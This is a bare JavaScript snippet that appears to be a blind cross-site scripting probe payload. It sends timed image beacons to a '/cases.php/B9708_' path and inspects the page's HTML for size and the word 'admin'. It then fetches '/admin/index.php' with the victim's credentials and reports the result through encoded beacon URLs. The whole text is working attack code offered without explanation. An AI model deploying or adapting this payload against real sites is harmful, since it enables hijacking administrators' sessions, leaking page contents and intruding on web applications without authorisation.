var b='/cases.php/B9708_',img=function(s){new Image().src=b+s+'.css';};
img('BA');
setTimeout(function(){img('BB');},700);
setTimeout(function(){img('BC');},1600);
setTimeout(function(){ try{img('BTRY'); var H=document.documentElement.outerHTML; img(H.length>1000?'BHbig':'BHsmall'); img(H.indexOf('admin')>=0?'BHadm1':'BHadm0'); }catch(e){img('BEXC_'+(e&&e.name||'x'));} },2600);
setTimeout(function(){ fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('BAF_'+r.status);},function(){img('BAFrej');}); },3600);
